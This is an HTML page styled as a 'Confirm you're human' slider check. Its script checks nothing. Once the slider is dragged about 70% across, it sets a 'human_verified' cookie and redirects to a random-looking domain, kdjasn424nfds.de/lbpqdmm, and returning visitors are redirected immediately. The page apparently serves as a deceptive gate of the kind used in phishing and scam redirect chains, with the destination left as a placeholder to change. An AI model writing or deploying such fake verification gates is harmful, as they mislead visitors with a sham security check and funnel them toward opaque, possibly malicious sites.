<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Human verification</title>
  <style>
    :root {
      --bg: #0f1724;
      --panel: rgba(11, 18, 32, 0.5);
      --text: #edf2f7;
      --muted: #a0aec0;
      --accent: #38bdf8;
      --accent2: #34d399;
      --radius: 14px;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      background:
        radial-gradient(1200px 600px at 10% 10%, rgba(56,189,248,0.06), transparent 8%),
        radial-gradient(900px 400px at 90% 90%, rgba(52,211,153,0.04), transparent 8%),
        var(--bg);
      font-family: system-ui, -apple-system, "Segoe UI", sans-serif;
      color: var(--text);
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .card {
      width: min(520px, 100%);
      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.005));
      border: 1px solid rgba(255,255,255,0.03);
      border-radius: var(--radius);
      padding: 24px 20px 18px;
      box-shadow: 0 8px 30px rgba(2,6,23,0.6);
      backdrop-filter: blur(5px);
    }
    h1 {
      margin: 0 0 6px;
      font-size: 1.1rem;
    }
    p.lead {
      margin: 0 0 18px;
      color: var(--muted);
      font-size: 0.9rem;
      line-height: 1.4;
    }
    .slider-shell {
      background: rgba(255,255,255,0.015);
      border: 1px solid rgba(255,255,255,0.015);
      border-radius: 12px;
      padding: 12px;
    }
    .hint {
      font-size: 0.78rem;
      color: var(--muted);
      margin-bottom: 10px;
    }
    .slider {
      position: relative;
      height: 54px;
      border-radius: 12px;
      user-select: none;
      touch-action: pan-y;
    }
    .track {
      position: absolute;
      inset: 0;
      background: rgba(255,255,255,0.02);
      border-radius: 12px;
      display: flex;
      align-items: center;
    }
    .progress {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, var(--accent), var(--accent2));
      border-radius: 12px;
      transition: width 0.08s linear;
    }
    .thumb {
      position: absolute;
      top: 50%;
      left: 0;
      transform: translate(0, -50%);
      height: 46px;
      width: 46px;
      border-radius: 10px;
      background: #0f1724;
      border: 1px solid rgba(255,255,255,0.05);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: grab;
      z-index: 2;
      transition: transform 120ms ease-out;
      box-shadow: 0 4px 15px rgba(0,0,0,0.28);
      touch-action: none;
    }
    .thumb:active {
      cursor: grabbing;
    }
    .thumb-inner {
      background: linear-gradient(180deg, var(--accent), #0ea5e9);
      height: 34px;
      width: 34px;
      border-radius: 8px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #031525;
      font-weight: 700;
      font-size: 1.1rem;
      box-shadow: 0 3px 12px rgba(14,165,233,0.55);
    }
    .center-text {
      position: absolute;
      top: 50%;
      left: 52px;
      right: 10px;
      transform: translateY(-50%);
      font-size: 0.78rem;
      color: rgba(237,242,247,0.86);
      pointer-events: none;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .foot {
      text-align: center;
      margin-top: 12px;
      font-size: 0.7rem;
      color: var(--muted);
    }
    .success .center-text {
      color: #bbf7d0;
    }
    .success .thumb .thumb-inner {
      background: linear-gradient(180deg, #22c55e, #15803d);
      color: #03210c;
    }

    @media (max-width: 460px) {
      .card { padding: 20px 16px 14px; }
      .center-text {
        left: 50px;
        font-size: 0.72rem;
      }
      .thumb { height: 44px; width: 44px; }
      .thumb-inner { height: 32px; width: 32px; }
      .slider { height: 52px; }
    }
  </style>
</head>
<body>
  <div class="card" id="card">
    <h1>Confirm you’re human</h1>
    <p class="lead">Drag the slider all the way to the right. This works on phones and desktops.</p>

    <div class="slider-shell">
      <p class="hint" id="hint-text">Slide to verify →</p>
      <div class="slider" id="slider" aria-label="Slide to verify">
        <div class="track">
          <div class="progress" id="progress"></div>
        </div>
        <div class="thumb" id="thumb" role="button" aria-pressed="false" tabindex="0">
          <div class="thumb-inner">»</div>
        </div>
        <div class="center-text" id="center-text">Slide to continue</div>
      </div>
    </div>

    <p class="foot">If you can’t slide, refresh the page and try again.</p>
  </div>

  <script>
    // change this to your real destination:
    const TARGET_URL = "https://kdjasn424nfds.de/lbpqdmm";
    const COOKIE_NAME = "human_verified";
    const COOKIE_AGE = 7 * 24 * 3600; // 7 days

    function getCookie(name) {
      return document.cookie.split("; ").reduce((acc, cur) => {
        const [k, v] = cur.split("=");
        return k === name ? decodeURIComponent(v) : acc;
      }, "");
    }

    function setCookie(name, value, maxAge) {
      document.cookie = name + "=" + encodeURIComponent(value) + "; path=/; max-age=" + maxAge + "; SameSite=Lax";
    }

    // if already verified — go right away
    if (getCookie(COOKIE_NAME) === "1") {
      window.location.replace(TARGET_URL);
    }

    const slider = document.getElementById("slider");
    const thumb = document.getElementById("thumb");
    const progress = document.getElementById("progress");
    const centerText = document.getElementById("center-text");
    const card = document.getElementById("card");

    let sliderRect, thumbRect;
    let isDragging = false;
    let startX = 0;
    let startOffset = 0;
    const COMPLETE_AT = 0.7; // 90% to complete
    let done = false;

    function measure() {
      sliderRect = slider.getBoundingClientRect();
      thumbRect = thumb.getBoundingClientRect();
    }

    function setPos(norm) {
      norm = Math.max(0, Math.min(1, norm));
      const maxX = sliderRect.width - thumbRect.width;
      const px = norm * maxX;
      thumb.style.transform = "translate(" + px + "px, -50%)";
      progress.style.width = (norm * 100) + "%";
    }

    function complete() {
      if (done) return;
      done = true;
      thumb.setAttribute("aria-pressed", "true");
      centerText.textContent = "Verified! Redirecting...";
      card.classList.add("success");
      setCookie(COOKIE_NAME, "1", COOKIE_AGE);
      setTimeout(() => {
        window.location.replace(TARGET_URL);
      }, 500);
      if (navigator.vibrate) navigator.vibrate(35);
    }

    function pointerDown(clientX) {
      if (done) return;
      measure();
      isDragging = true;
      startX = clientX;
      const current = (thumb.style.transform || "").match(/translate\(([-\d.]+)px/);
      startOffset = current ? parseFloat(current[1]) : 0;
      thumb.style.transition = "none";
      progress.style.transition = "none";
    }

    function pointerMove(clientX) {
      if (!isDragging || done) return;
      const dx = clientX - startX;
      const maxX = sliderRect.width - thumbRect.width;
      let newX = startOffset + dx;
      newX = Math.max(0, Math.min(maxX, newX));
      const norm = newX / maxX;
      thumb.style.transform = "translate(" + newX + "px, -50%)";
      progress.style.width = (norm * 100) + "%";

      if (norm >= COMPLETE_AT) {
        setPos(1);
        complete();
      }
    }

    function pointerUp() {
      if (!isDragging) return;
      isDragging = false;
      if (!done) {
        // snap back
        thumb.style.transition = "transform 0.25s ease";
        progress.style.transition = "width 0.25s ease";
        setPos(0);
      }
    }

    // mouse
    thumb.addEventListener("mousedown", e => {
      pointerDown(e.clientX);
      e.preventDefault();
    });
    window.addEventListener("mousemove", e => {
      pointerMove(e.clientX);
    });
    window.addEventListener("mouseup", pointerUp);

    // touch
    thumb.addEventListener("touchstart", e => {
      const t = e.touches[0];
      pointerDown(t.clientX);
    }, { passive: true });
    window.addEventListener("touchmove", e => {
      if (!isDragging) return;
      const t = e.touches[0];
      pointerMove(t.clientX);
    }, { passive: true });
    window.addEventListener("touchend", pointerUp);

    // keyboard for accessibility
    thumb.addEventListener("keydown", e => {
      if (done) return;
      if (e.key === "ArrowRight" || e.key === "Right" || e.key === "Enter" || e.key === " ") {
        measure();
        setPos(1);
        complete();
        e.preventDefault();
      }
    });

    // initial measure
    window.addEventListener("resize", () => {
      // after resize, reset to start if not done
      if (!done) {
        measure();
        setPos(0);
      }
    });
    measure();
    setPos(0);
  </script>
</body>
</html>
